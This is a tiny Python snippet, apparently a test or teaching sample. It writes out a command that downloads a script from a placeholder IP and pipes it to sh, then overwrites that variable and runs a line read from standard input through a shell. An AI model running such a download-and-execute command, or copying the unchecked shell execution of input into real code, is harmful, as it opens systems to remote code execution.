import subprocess
import sys

c = "curl -s http://203.0.113.5/x | sh"
c, d = sys.stdin.readline(), 1
subprocess.run(c, shell=True)
